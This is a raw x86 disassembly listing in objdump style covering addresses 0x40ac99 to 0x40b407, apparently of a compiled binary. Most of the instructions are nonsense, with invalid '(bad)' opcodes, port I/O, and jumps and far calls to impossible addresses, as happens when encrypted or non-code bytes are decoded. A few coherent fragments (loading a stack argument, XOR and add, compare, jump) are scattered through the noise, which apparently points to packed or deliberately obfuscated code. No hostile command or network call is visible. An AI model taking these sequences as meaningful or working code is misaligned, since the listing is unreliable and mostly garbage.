  40ac99:	in     eax,dx
  40ac9a:	xchg   edx,eax
  40ac9b:	mul    BYTE PTR [ebp-0xb]
  40ac9e:	mov    dh,0x79
  40aca0:	out    dx,eax
  40aca1:	xchg   DWORD PTR [eax],eax
  40aca3:	xor    eax,0x49c75856
  40aca8:	(bad)  
  40aca9:	adc    DWORD PTR [ecx],edi
  40acab:	dec    esi
  40acac:	out    dx,al
  40acad:	shl    DWORD PTR [ecx+0x5554640f],cl
  40acb3:	mov    ah,0x2d
  40acb5:	push   ebx
  40acb6:	sub    al,BYTE PTR [esi+0x274d4de0]
  40acbc:	out    dx,al
  40acbd:	imul   esi,eax,0x39
  40acc0:	pop    ds
  40acc1:	push   eax
  40acc2:	sbb    edx,ecx
  40acc4:	add    al,0xd
  40acc6:	js     0x40acde
  40acc8:	mov    dl,0x19
  40acca:	lock add ah,bl
  40accd:	fptan  
  40accf:	pop    ds
  40acd0:	mov    dl,0xaa
  40acd2:	jge    0x40acea
  40acd4:	call   0x20fe0222
  40acd9:	dec    edx
  40acda:	xor    DWORD PTR [ebx-0x30],eax
  40acdd:	sub    eax,0xfb9dc06c
  40ace3:	and    eax,0x5da6944d
  40ace8:	xor    BYTE PTR [edi],dl
  40acea:	add    eax,0x75630c1e
  40acef:	mov    ah,BYTE PTR [ebp-0x373d0990]
  40acf5:	mov    esp,0xee22f08d
  40acfa:	mov    ah,0x38
  40acfc:	fwait
  40acfd:	adc    ah,0xa9
  40ad00:	loope  0x40ac8c
  40ad02:	mov    DWORD PTR [edi+0x2e3562ad],eax
  40ad08:	or     BYTE PTR [ebx],cl
  40ad0a:	jo     0x40ad2f
  40ad0c:	pop    es
  40ad0d:	inc    esp
  40ad0e:	ds jbe 0x40ace3
  40ad11:	jb     0x40acbf
  40ad13:	sub    ch,bl
  40ad15:	xchg   BYTE PTR [ecx],dh
  40ad17:	xchg   edx,eax
  40ad18:	iret   
  40ad19:	push   ebx
  40ad1a:	popf   
  40ad1b:	fiadd  DWORD PTR [eax+ecx*8-0x79]
  40ad1f:	(bad)  
  40ad20:	fsubp  st(3),st
  40ad22:	or     BYTE PTR [ebx-0x65],al
  40ad25:	mov    dh,0x80
  40ad27:	mov    ebx,0x4f7774b0
  40ad2c:	mov    cl,0xfc
  40ad2e:	pop    edi
  40ad2f:	mov    ch,0x6c
  40ad31:	pop    esp
  40ad32:	lods   eax,DWORD PTR ds:[esi]
  40ad33:	pop    ds
  40ad34:	push   edi
  40ad35:	sub    BYTE PTR [edi+0xa],ch
  40ad38:	jmp    0x40ad3d
  40ad3a:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40ad41:	add    al,0x8
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi-0x28ab0239]
  40ad81:	inc    DWORD PTR [eax]
  40ad83:	repz jle 0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	scas   eax,DWORD PTR es:[edi]
  40ad8b:	dec    ecx
  40ad8c:	or     BYTE PTR [ecx+eiz*2+0x77],0x58
  40ad91:	dec    ebx
  40ad92:	sbb    BYTE PTR [ebx+0x35],0x8e
  40ad96:	cmp    eax,0x63da09fd
  40ad9b:	int    0xd2
  40ad9d:	xchg   ebx,eax
  40ad9e:	fsub   QWORD PTR [ecx]
  40ada0:	dec    eax
  40ada1:	adc    DWORD PTR [edx-0x1cd1159d],ebx
  40ada7:	icebp  
  40ada8:	fisubr DWORD PTR [eax]
  40adaa:	inc    ax
  40adac:	sti    
  40adad:	adc    al,0xc3
  40adaf:	test   eax,0x70558cac
  40adb4:	loopne 0x40ad93
  40adb6:	pop    edi
  40adb7:	sub    ebp,DWORD PTR [ebx+0x68]
  40adba:	pop    edx
  40adbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adbc:	sar    DWORD PTR [esi-0x2854607f],1
  40adc2:	inc    esi
  40adc3:	mov    WORD PTR gs:[ebp+0x17cb94cb],?
  40adca:	jecxz  0x40adf6
  40adcc:	leave  
  40adcd:	ror    BYTE PTR [ebp-0x26e7c3d],1
  40add3:	add    esp,eax
  40add5:	cmp    cl,BYTE PTR [ecx*1-0xc7a3aa8]
  40addc:	dec    ecx
  40addd:	xchg   DWORD PTR [esi],eax
  40addf:	or     dh,bh
  40ade1:	adc    al,0xd
  40ade3:	(bad)  
  40ade4:	push   ebp
  40ade5:	mov    dh,0xce
  40ade7:	in     eax,dx
  40ade8:	jo     0x40ad6e
  40adea:	shl    BYTE PTR [esi+0x6a9f998e],1
  40adf0:	sub    dh,BYTE PTR [edi-0x17]
  40adf3:	sbb    BYTE PTR [ebp-0x2dbfa200],0x10
  40adfa:	push   eax
  40adfb:	mov    ds:0x76a2aa99,eax
  40ae00:	mov    bh,0xab
  40ae02:	mov    dh,0x8a
  40ae04:	jns    0x40ae77
  40ae06:	mov    al,0x32
  40ae08:	in     eax,dx
  40ae09:	popf   
  40ae0a:	pop    edi
  40ae0b:	sub    eax,0xf0e464e1
  40ae10:	sti    
  40ae11:	mov    BYTE PTR [eax+0x1c],dh
  40ae14:	pop    eax
  40ae15:	mov    dl,0x6c
  40ae17:	xchg   DWORD PTR ds:0xc4479e3b,ebx
  40ae1d:	adc    al,0x96
  40ae1f:	sbb    ebx,edi
  40ae21:	jbe    0x40ae64
  40ae23:	imul   ecx,DWORD PTR [ebx+0x1c04b1d5],0xb9219ed9
  40ae2d:	mov    bh,BYTE PTR [edi]
  40ae2f:	sbb    BYTE PTR [eax-0xb],0xe9
  40ae33:	ret    0x6e58
  40ae36:	sbb    eax,0x4ba32a34
  40ae3b:	imul   eax,DWORD PTR [edi+0x78c4ee78],0x7d50eaa9
  40ae45:	gs or  bh,0xa0
  40ae49:	repnz popa 
  40ae4b:	mov    dh,0x72
  40ae4d:	fwait
  40ae4e:	ds xchg edx,eax
  40ae50:	lea    esp,[esi+esi*8]
  40ae53:	xchg   BYTE PTR [ebp+0x7cc6cdcf],ah
  40ae59:	jl     0x40ae49
  40ae5b:	adc    DWORD PTR [eax-0x5e],esi
  40ae5e:	or     BYTE PTR ds:0x5933ed81,dh
  40ae64:	clc    
  40ae65:	and    BYTE PTR [eax+0x14],al
  40ae68:	and    eax,0xd2645c7
  40ae6d:	mov    esi,DWORD PTR [ecx]
  40ae6f:	adc    BYTE PTR ds:0x840452d4,0x2f
  40ae76:	cwde   
  40ae77:	sbb    cl,BYTE PTR [ecx]
  40ae79:	inc    ebp
  40ae7a:	ja     0x40ae5a
  40ae7c:	mov    ch,0x98
  40ae7e:	ret    0x4f10
  40ae81:	pusha  
  40ae82:	les    ebx,FWORD PTR [edx]
  40ae84:	xlat   BYTE PTR ds:[ebx]
  40ae85:	cmp    bh,bl
  40ae87:	outs   dx,DWORD PTR ds:[esi]
  40ae88:	ins    BYTE PTR es:[edi],dx
  40ae89:	mov    ds,WORD PTR [ebx-0x4e]
  40ae8c:	jnp    0x40aecf
  40ae8e:	mov    edi,0x10ece7dc
  40ae93:	dec    esi
  40ae94:	or     al,0x16
  40ae96:	xlat   BYTE PTR ds:[ebx]
  40ae97:	jno    0x40aee5
  40ae99:	fs scas al,BYTE PTR es:[edi]
  40ae9b:	or     dh,cl
  40ae9d:	xchg   esi,eax
  40ae9e:	ret    
  40ae9f:	(bad)  
  40aea0:	fadd   QWORD PTR [ebx+0x34abd008]
  40aea6:	jmp    DWORD PTR [ebx-0x7ee229da]
  40aeac:	scas   eax,DWORD PTR es:[edi]
  40aead:	(bad)  [eax]
  40aeaf:	(bad)  
  40aeb0:	pop    ecx
  40aeb1:	mov    ds:0x8ef31bf3,eax
  40aeb6:	or     esp,DWORD PTR [esi+0x16]
  40aeb9:	pop    ss
  40aeba:	mov    eax,ds:0xbcbdad6f
  40aebf:	mov    al,ds:0x17424bd0
  40aec4:	arpl   si,sp
  40aec6:	adc    al,ah
  40aec8:	or     BYTE PTR cs:[ecx*8+0x17ada2d7],0xcf
  40aed1:	mov    BYTE PTR [edx],ch
  40aed3:	inc    edi
  40aed4:	fld    st(5)
  40aed6:	in     eax,dx
  40aed7:	adc    al,0x7a
  40aed9:	xor    al,BYTE PTR [ecx+0x4]
  40aedc:	or     eax,0xad3c833d
  40aee1:	jg     0x40af2b
  40aee3:	scas   al,BYTE PTR es:[edi]
  40aee4:	xor    eax,0x34f13cb2
  40aee9:	stc    
  40aeea:	std    
  40aeeb:	sar    DWORD PTR [ebp-0x7a],0x7a
  40aeef:	fs clc 
  40aef1:	fstp   TBYTE PTR [eax]
  40aef3:	int    0xca
  40aef5:	shl    BYTE PTR [edx-0x2c4c2a15],1
  40aefb:	stos   DWORD PTR es:[edi],eax
  40aefc:	aad    0xb3
  40aefe:	mov    dl,0xf3
  40af00:	mov    edi,0xd9adc15f
  40af05:	aaa    
  40af06:	mov    DWORD PTR [ecx-0x3b],ebx
  40af09:	add    esp,ebx
  40af0b:	test   BYTE PTR [eax],0x5c
  40af0e:	jl     0x40aed1
  40af10:	int3   
  40af11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af12:	pop    ss
  40af13:	mov    eax,0x46fe5bff
  40af18:	push   edx
  40af19:	xor    DWORD PTR [edi+ecx*4-0x676af53e],ebx
  40af20:	retf   
  40af21:	ins    BYTE PTR es:[edi],dx
  40af22:	mov    cl,0x4a
  40af24:	sub    esp,DWORD PTR [ebp+eax*8+0x114c003a]
  40af2b:	push   cs
  40af2c:	jge    0x40afa6
  40af2e:	pop    esi
  40af2f:	mov    ch,0x34
  40af31:	not    BYTE PTR [edi+0x7348c24a]
  40af37:	fisub  WORD PTR [esi+edx*2]
  40af3a:	fisttp QWORD PTR [eax]
  40af3c:	pop    edi
  40af3d:	(bad)  
  40af3e:	(bad)  
  40af3f:	imul   esp,DWORD PTR [esi-0x48],0xffffff9d
  40af43:	popf   
  40af44:	pop    ecx
  40af45:	xchg   ebp,eax
  40af46:	loop   0x40af21
  40af48:	imul   ebp,DWORD PTR [ecx+0x2a2a8540],0x2c890ff9
  40af52:	push   esi
  40af53:	out    dx,al
  40af54:	sub    ebx,DWORD PTR [ecx+0x75]
  40af57:	clc    
  40af58:	jp     0x40af5f
  40af5a:	call   0xcf143121
  40af5f:	mov    dh,0xc7
  40af61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af62:	in     al,dx
  40af63:	cld    
  40af64:	das    
  40af65:	xor    esp,DWORD PTR [ecx+0x547f6127]
  40af6b:	jecxz  0x40af82
  40af6d:	enter  0xfb46,0x42
  40af71:	push   ds
  40af72:	mov    ebp,0x46c685e8
  40af77:	call   0xf3f1:0xc9075a05
  40af7e:	(bad)  
  40af7f:	jno    0x40af6a
  40af81:	std    
  40af82:	jge    0x40af63
  40af84:	or     eax,0x250f3554
  40af89:	ja     0x40af58
  40af8b:	lds    esp,FWORD PTR [ebx+0x58]
  40af8e:	jg     0x40af31
  40af90:	test   al,0x20
  40af92:	sahf   
  40af93:	mov    DWORD PTR [edi+ebx*4],0x4b09a0e6
  40af9a:	inc    eax
  40af9b:	fist   DWORD PTR [esi]
  40af9d:	jp     0x40af3a
  40af9f:	sub    DWORD PTR [ecx],eax
  40afa1:	ja     0x40af96
  40afa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afa4:	fadd   DWORD PTR [edi-0x57]
  40afa7:	ins    BYTE PTR es:[edi],dx
  40afa8:	add    ecx,edi
  40afaa:	sub    al,0x4f
  40afac:	js     0x40af45
  40afae:	cs cs out dx,eax
  40afb1:	pop    ds
  40afb2:	repz in al,0xbc
  40afb5:	cdq    
  40afb6:	cwde   
  40afb7:	inc    eax
  40afb8:	out    0xa6,eax
  40afba:	(bad)  
  40afbb:	js     0x40afc4
  40afbd:	dec    ecx
  40afbe:	or     BYTE PTR [eax+edi*1],cl
  40afc1:	adc    eax,0xfb8daa4b
  40afc6:	xchg   DWORD PTR [esi+0x794c497c],ebp
  40afcc:	ret    
  40afcd:	add    al,0x3a
  40afcf:	mov    ecx,0x535a9ef0
  40afd4:	xchg   esp,eax
  40afd5:	popa   
  40afd6:	or     al,0x7b
  40afd8:	or     eax,0xa9ba87fe
  40afdd:	xor    dh,dh
  40afdf:	mov    cs,ecx
  40afe1:	inc    esi
  40afe2:	icebp  
  40afe3:	ss dec esi
  40afe5:	pop    ebx
  40afe6:	sti    
  40afe7:	xchg   ecx,eax
  40afe8:	aad    0xb5
  40afea:	inc    ecx
  40afeb:	sbb    ebp,DWORD PTR [edi+0x24]
  40afee:	aaa    
  40afef:	or     eax,0x33e98dd4
  40aff4:	add    DWORD PTR [ecx-0x17],ebp
  40aff7:	call   0xc69d:0x80b01edb
  40affe:	outs   dx,DWORD PTR ds:[esi]
  40afff:	imul   edx,edi,0x3221d981
  40b005:	push   ecx
  40b006:	js     0x40b00f
  40b008:	dec    esi
  40b009:	xor    DWORD PTR [ecx-0x8de7dc5],0xffffffa8
  40b010:	int3   
  40b011:	dec    ecx
  40b012:	js     0x40af9d
  40b014:	fstp   DWORD PTR [edx-0x31]
  40b017:	imul   ebp,ebp,0xffffff8a
  40b01a:	cli    
  40b01b:	jne    0x40afb6
  40b01d:	ins    BYTE PTR es:[edi],dx
  40b01e:	xchg   ebx,eax
  40b01f:	or     edx,DWORD PTR [esi]
  40b021:	cld    
  40b022:	jb     0x40afc8
  40b024:	pop    eax
  40b025:	mov    edi,0x54f9b3b1
  40b02a:	dec    esp
  40b02b:	jnp    0x40b063
  40b02d:	dec    eax
  40b02e:	fs sbb esp,ebp
  40b031:	cmp    cl,BYTE PTR [edi]
  40b033:	jmp    0x40afea
  40b035:	inc    ebx
  40b036:	das    
  40b037:	(bad)  
  40b038:	(bad)  
  40b039:	div    BYTE PTR [edi-0x6c9009fb]
  40b03f:	jnp    0x40b074
  40b041:	ret    
  40b042:	mov    ds:0x4e4ec036,eax
  40b047:	ss cmp eax,0x7776cb67
  40b04d:	std    
  40b04e:	shl    dh,1
  40b050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b051:	scas   eax,DWORD PTR es:[edi]
  40b052:	mov    al,0x2b
  40b054:	cdq    
  40b055:	sub    DWORD PTR [ebp+0x29],0xf314e112
  40b05c:	mov    edi,DWORD PTR [edx-0xd]
  40b05f:	gs push ebp
  40b061:	call   0xfa4f08a2
  40b066:	out    0xe2,eax
  40b068:	fnsave [esi-0x47]
  40b06b:	(bad)  
  40b06c:	js     0x40afff
  40b06e:	or     eax,0x9c34c372
  40b073:	xchg   esp,eax
  40b074:	or     edi,DWORD PTR [ecx-0x41]
  40b077:	shl    edi,cl
  40b079:	jae    0x40b0b2
  40b07b:	ins    DWORD PTR es:[edi],dx
  40b07c:	ja     0x40b01c
  40b07e:	fnstcw WORD PTR [esi]
  40b080:	(bad)  [ecx+0x33a69e2a]
  40b086:	(bad)  
  40b087:	repnz stos BYTE PTR es:[edi],al
  40b089:	and    esp,DWORD PTR [esi-0x42]
  40b08c:	cmc    
  40b08d:	adc    al,0x8b
  40b08f:	inc    ebp
  40b090:	loopne 0x40b01d
  40b092:	dec    ebp
  40b093:	clc    
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	jmp    0x40b040
  40b0bb:	inc    esi
  40b0bc:	jbe    0x40b0ca
  40b0be:	(bad)  
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	mov    cl,0xe
  40b0c7:	xor    ecx,DWORD PTR [ebx-0x67417081]
  40b0cd:	loope  0x40b0d2
  40b0cf:	shl    WORD PTR es:[edx+0x6e116bfe],1
  40b0d7:	pop    ss
  40b0d8:	loopne 0x40b07d
  40b0da:	imul   esp,DWORD PTR [ebp+0x6192a3c0],0xfffffff7
  40b0e1:	retf   0xce90
  40b0e4:	inc    eax
  40b0e5:	push   ecx
  40b0e6:	outs   dx,DWORD PTR ds:[esi]
  40b0e7:	idiv   DWORD PTR [ebp+0x2bccb7a0]
  40b0ed:	push   0x6767e50c
  40b0f2:	jns    0x40b15e
  40b0f4:	pop    ds
  40b0f5:	sub    DWORD PTR ds:0x21571542,0xfffffffa
  40b0fc:	sbb    BYTE PTR [edi-0x5b],ch
  40b0ff:	out    dx,eax
  40b100:	mov    dl,al
  40b102:	xor    eax,0xd6475483
  40b107:	pop    esi
  40b108:	dec    edi
  40b109:	jo     0x40b0a1
  40b10b:	sbb    ebp,DWORD PTR [ecx+0x7e7b71e1]
  40b111:	mov    bp,cx
  40b114:	xchg   DWORD PTR [ecx],eax
  40b116:	(bad)  
  40b117:	push   0xffffffaf
  40b119:	add    ebp,DWORD PTR [eax]
  40b11b:	sub    eax,0xffffffa3
  40b11e:	shl    BYTE PTR [edx],1
  40b120:	inc    edx
  40b121:	lahf   
  40b122:	pop    eax
  40b123:	mov    ebx,0x7f281b7
  40b128:	pop    ss
  40b129:	mov    bh,0xfd
  40b12b:	aaa    
  40b12c:	out    0x94,al
  40b12e:	ins    DWORD PTR es:[edi],dx
  40b12f:	pop    eax
  40b130:	pop    eax
  40b131:	xchg   edx,eax
  40b132:	aad    0xbd
  40b134:	cdq    
  40b135:	arpl   WORD PTR [ebp+0x7f17a657],bp
  40b13b:	in     al,dx
  40b13c:	sbb    edi,edx
  40b13e:	pop    ss
  40b13f:	jae    0x40b152
  40b141:	stos   DWORD PTR es:[edi],eax
  40b142:	sub    al,ah
  40b144:	xchg   ebp,eax
  40b145:	mov    ecx,0xc27dd28
  40b14a:	dec    DWORD PTR [ecx*8-0x6622486d]
  40b151:	xor    cl,BYTE PTR [ecx]
  40b153:	fdivr  QWORD PTR [ecx+0x55e0d8d1]
  40b159:	sub    bh,BYTE PTR ds:0xdd5fc07
  40b15f:	jmp    0x819f:0x4b46b927
  40b166:	ins    DWORD PTR es:[edi],dx
  40b167:	jecxz  0x40b1ab
  40b169:	aad    0x6
  40b16b:	fdivr  DWORD PTR [edi+0x55]
  40b16e:	ss add ebp,edx
  40b171:	sti    
  40b172:	push   esi
  40b173:	mov    bh,0xcf
  40b175:	dec    eax
  40b176:	inc    eax
  40b177:	mov    BYTE PTR [ebx-0xd],dh
  40b17a:	mov    fs,WORD PTR [eax+ecx*1+0x5f37f458]
  40b181:	and    eax,esp
  40b183:	ins    BYTE PTR es:[edi],dx
  40b184:	test   eax,0xf3f64893
  40b189:	inc    esp
  40b18a:	or     BYTE PTR [eax],bh
  40b18c:	pop    edx
  40b18d:	scas   al,BYTE PTR es:[edi]
  40b18e:	pop    eax
  40b18f:	mov    gs:0x3e36de41,eax
  40b195:	dec    esp
  40b196:	add    DWORD PTR [edx+0x37],esi
  40b199:	(bad)  [edx+0x34]
  40b19c:	jmp    0x1488533c
  40b1a1:	push   0x56
  40b1a3:	or     al,BYTE PTR [edi]
  40b1a5:	stos   DWORD PTR es:[edi],eax
  40b1a6:	cld    
  40b1a7:	outs   dx,DWORD PTR ds:[esi]
  40b1a8:	arpl   WORD PTR [edi],sp
  40b1aa:	dec    esp
  40b1ab:	pop    es
  40b1ac:	pop    es
  40b1ad:	bound  eax,QWORD PTR ds:0x87242fef
  40b1b3:	repnz fld QWORD PTR [ebp+esi*2+0x29]
  40b1b8:	adc    al,0xd4
  40b1ba:	inc    ebp
  40b1bb:	test   eax,0xd942941
  40b1c0:	sub    bl,BYTE PTR [ecx+0x3d]
  40b1c3:	sub    bl,ch
  40b1c5:	or     BYTE PTR [ecx+0x5c],dh
  40b1c8:	push   es
  40b1c9:	inc    ebx
  40b1ca:	mov    ah,0x3c
  40b1cc:	mov    ebp,0xfe9541ec
  40b1d1:	rcl    DWORD PTR [ebp-0x5c],0x22
  40b1d5:	jb     0x40b242
  40b1d7:	dec    edi
  40b1d8:	xchg   edi,eax
  40b1d9:	pop    esi
  40b1da:	aaa    
  40b1db:	mov    BYTE PTR [ecx-0x3f],al
  40b1de:	push   edx
  40b1df:	(bad)  
  40b1e0:	daa    
  40b1e1:	jmp    0xa57d1e22
  40b1e6:	pop    edi
  40b1e7:	pop    ds
  40b1e8:	retf   
  40b1e9:	lock inc edi
  40b1eb:	adc    DWORD PTR ds:0xe7dddf05,esi
  40b1f1:	shl    bl,0xa8
  40b1f4:	inc    ecx
  40b1f5:	test   BYTE PTR [eax+0x69],0x47
  40b1f9:	out    0xa9,eax
  40b1fb:	(bad)  
  40b1fc:	(bad)  
  40b1fd:	xor    BYTE PTR [eax],al
  40b1ff:	loope  0x40b189
  40b201:	call   0x92fa3b60
  40b206:	and    BYTE PTR [ebx],bl
  40b208:	add    al,0xba
  40b20a:	leave  
  40b20b:	and    BYTE PTR [eax+0x1b9bca6f],0x94
  40b212:	rcr    DWORD PTR [eax-0x38c457fc],0x95
  40b219:	mov    ebx,DWORD PTR [edx-0x419f7267]
  40b21f:	ja     0x40b220
  40b221:	lea    edx,[ebx+0x6eafbe4f]
  40b227:	add    DWORD PTR [eax],edi
  40b229:	pusha  
  40b22a:	jmp    0xf6637584
  40b22f:	sub    eax,DWORD PTR [ebx-0x4421c132]
  40b235:	mov    al,0xf2
  40b237:	pop    ds
  40b238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b239:	ror    ch,cl
  40b23b:	inc    eax
  40b23c:	inc    eax
  40b23d:	jmp    0x1298ef50
  40b242:	sub    DWORD PTR [edx+0x43],ebx
  40b245:	lahf   
  40b246:	int3   
  40b247:	mul    edx
  40b249:	sbb    BYTE PTR [edi+0x15],dl
  40b24c:	pop    edx
  40b24d:	xor    esp,esi
  40b24f:	retf   
  40b250:	xchg   dl,bl
  40b252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b253:	xor    ebp,DWORD PTR [ebx+0x7]
  40b256:	jmp    0xdba2:0x7dfead36
  40b25d:	jmp    0x1a4e620c
  40b262:	(bad)  
  40b263:	cdq    
  40b264:	rol    DWORD PTR [ebp+0x72717bfa],1
  40b26a:	xchg   BYTE PTR [esi],ah
  40b26c:	jmp    0x40b2e7
  40b26e:	jns    0x40b212
  40b270:	test   eax,0xf2be2060
  40b275:	arpl   WORD PTR [esi-0x71adf544],bp
  40b27b:	mov    esi,0xc0fe616d
  40b280:	gs addr16 cmp ebx,0xffffffb6
  40b285:	ret    0xfa5c
  40b288:	cmp    DWORD PTR [eax],esp
  40b28a:	and    al,0x30
  40b28c:	jg     0x40b230
  40b28e:	mov    bh,dl
  40b290:	push   cs
  40b291:	test   BYTE PTR [ecx],ah
  40b293:	out    dx,eax
  40b294:	iret   
  40b295:	ja     0x40b262
  40b297:	sub    edi,DWORD PTR ds:0x89d9e45d
  40b29d:	bound  esp,QWORD PTR [ebp+0x60]
  40b2a0:	dec    ebx
  40b2a1:	ret    0xaa03
  40b2a4:	(bad)  
  40b2a5:	cmp    eax,0xab35704e
  40b2aa:	scas   eax,DWORD PTR es:[edi]
  40b2ab:	push   esp
  40b2ac:	lea    eax,[ebx+0x1d]
  40b2af:	fsubr  st,st(6)
  40b2b1:	mov    cl,0x20
  40b2b3:	rcr    BYTE PTR [ecx+eiz*8+0x5b4afecd],cl
  40b2ba:	jbe    0x40b2ab
  40b2bc:	xchg   edi,eax
  40b2bd:	inc    esi
  40b2be:	out    dx,al
  40b2bf:	popf   
  40b2c0:	out    dx,eax
  40b2c1:	int3   
  40b2c2:	pop    ecx
  40b2c3:	fldenv [esi+0x54605b38]
  40b2c9:	fwait
  40b2ca:	dec    edi
  40b2cb:	adc    DWORD PTR [ebx],ebp
  40b2cd:	pop    edi
  40b2ce:	cmp    al,0x3c
  40b2d0:	sub    al,0xf1
  40b2d2:	mov    ds:0xf00cfc45,al
  40b2d7:	(bad)  
  40b2d8:	cs push 0xffffffd3
  40b2db:	xor    edx,DWORD PTR [eax-0x663c8552]
  40b2e1:	rol    DWORD PTR [esi],1
  40b2e3:	fs jb  0x40b2ad
  40b2e6:	arpl   WORD PTR [esi],si
  40b2e8:	aad    0x73
  40b2ea:	aas    
  40b2eb:	addr16 pop ebp
  40b2ed:	dec    edx
  40b2ee:	sbb    ecx,edx
  40b2f0:	int3   
  40b2f1:	mov    BYTE PTR gs:[edx],dl
  40b2f4:	cld    
  40b2f5:	aad    0xdc
  40b2f7:	jno    0x40b333
  40b2f9:	je     0x40b290
  40b2fb:	mov    esp,0x9bd8705c
  40b300:	idiv   DWORD PTR [edi+0x72dffb7d]
  40b306:	shr    ah,0xd1
  40b309:	ds inc ecx
  40b30b:	adc    DWORD PTR [eax+edi*4+0x34],ebp
  40b30f:	push   esp
  40b310:	cmc    
  40b311:	addr16 dec eax
  40b313:	jmp    0x40b367
  40b315:	pop    ss
  40b316:	imul   esi,DWORD PTR [esi+esi*2+0x2dabd15f],0xb90d0510
  40b321:	retf   
  40b322:	jmp    0x40b398
  40b324:	jne    0x40b2da
  40b326:	mov    WORD PTR [edi+0x7ecb956f],cs
  40b32c:	imul   esi,DWORD PTR [edx],0xffffffcf
  40b32f:	push   0xf1938001
  40b334:	jg     0x40b382
  40b336:	adc    DWORD PTR [ecx+0x1a362459],ebp
  40b33c:	xchg   ecx,eax
  40b33d:	lods   eax,DWORD PTR ds:[esi]
  40b33e:	repnz cdq 
  40b340:	shl    dl,1
  40b342:	inc    esp
  40b343:	mov    ebp,0x3aa6740d
  40b348:	cld    
  40b349:	xor    eax,0xfaa1bac7
  40b34e:	(bad)  
  40b34f:	outs   dx,DWORD PTR ds:[esi]
  40b350:	call   DWORD PTR [esi+ecx*1+0x69]
  40b354:	jge    0x40b39e
  40b356:	sub    DWORD PTR [edi+0x17725521],ecx
  40b35c:	xchg   ecx,eax
  40b35d:	pop    esp
  40b35e:	sub    eax,0xc098d87d
  40b363:	xor    eax,0x36619df7
  40b368:	xchg   edx,eax
  40b369:	fdivp  st(6),st
  40b36b:	lods   al,BYTE PTR ds:[esi]
  40b36c:	(bad)  
  40b36d:	fcomp  QWORD PTR [esi+0x3210e4e8]
  40b373:	dec    ebp
  40b374:	sahf   
  40b375:	xchg   ebx,eax
  40b376:	fst    DWORD PTR [edi+0x78]
  40b379:	mov    ebx,0xcfc0d5c8
  40b37e:	stos   BYTE PTR es:[edi],al
  40b37f:	xchg   ebx,eax
  40b380:	push   es
  40b381:	pushf  
  40b382:	imul   ebp,DWORD PTR [esi-0x35402af9],0x20
  40b389:	call   0xa7512ea3
  40b38e:	jne    0x40b394
  40b390:	(bad)  
  40b391:	mov    bl,0xfd
  40b393:	jl     0x40b3a8
  40b395:	dec    ecx
  40b396:	push   edi
  40b397:	shl    DWORD PTR [ecx-0x3faf65b],1
  40b39d:	jns    0x40b34e
  40b39f:	xchg   BYTE PTR gs:[esi],cl
  40b3a2:	aas    
  40b3a3:	in     al,dx
  40b3a4:	push   es
  40b3a5:	mov    ecx,0xcc8027f6
  40b3aa:	mov    eax,0xb87e8365
  40b3af:	jle    0x40b419
  40b3b1:	ss jno 0x40b42f
  40b3b4:	adc    bh,BYTE PTR [edx+ebx*8]
  40b3b7:	in     eax,0xbd
  40b3b9:	mov    dh,0x73
  40b3bb:	or     DWORD PTR [edi+0x1],0x3b
  40b3bf:	push   edx
  40b3c0:	xor    DWORD PTR [ecx-0xb],edx
  40b3c3:	nop
  40b3c4:	inc    eax
  40b3c5:	ss pop ds
  40b3c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3c8:	push   eax
  40b3c9:	mov    eax,DWORD PTR [ebp+0x8]
  40b3cc:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0xe6ad16d7
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	sub    BYTE PTR [ebp+edi*4+0x550f62cc],al
  40b3f7:	sub    ah,BYTE PTR [edx+edx*4-0x1d]
  40b3fb:	sub    al,0x7c
  40b3fd:	mul    DWORD PTR [ebx+edi*4]
  40b400:	vunpckhpd xmm1,xmm4,xmm6
  40b404:	sbb    DWORD PTR [ecx],eax
  40b406:	clc    
  40b407:	mov    BYTE PTR [ebp-0x66],ah
